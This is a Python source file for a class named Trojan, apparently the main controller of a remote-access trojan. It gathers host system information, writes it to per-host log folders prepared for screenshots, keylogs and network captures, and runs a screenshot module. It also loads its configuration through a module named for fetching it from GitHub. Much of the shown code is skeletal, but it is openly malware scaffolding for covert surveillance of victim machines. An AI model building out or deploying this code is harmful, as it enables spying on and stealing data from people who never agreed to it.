import asyncio
import json
import os
from mod1_sysinfo import SysInfo
from mod2_screenshotter import Screenshotter
from get_config_from_github import Config

class Trojan:
    def __init__(self):
        self.get_config()
        self.host_info = SysInfo().fetch_info()
        self.screenshotter = Screenshotter
        self.controller()

    def get_config(self):
        self.config = Config().get_config()

    def initiate_host(self):
        print(self.host_info)
        host_id = self.host_info['id']
        
        script_dir = os.path.dirname(os.path.realpath(__file__))

        log_path = os.path.join(script_dir, "..", "logs", host_id)
        os.makedirs(log_path, exist_ok=True)
            
        with open(os.path.join(log_path, "sysinfo.json"), "w") as outfile:
            json.dump(self.host_info, outfile, indent=4)

        os.makedirs(os.path.join(log_path, "screenshots"), exist_ok=True)
        os.makedirs(os.path.join(log_path, "keylogs"), exist_ok=True)
        os.makedirs(os.path.join(log_path, "network"), exist_ok=True)

    
    def controller(self):
        print(self.config)


    def module2_ss(self):
        asyncio.create_task(self.screenshotter.start())

    def module2_ss_stop(self):
        self.screenshotter.stop()


if __name__ == '__main__':
    trojan = Trojan()
    trojan.initiate_host()
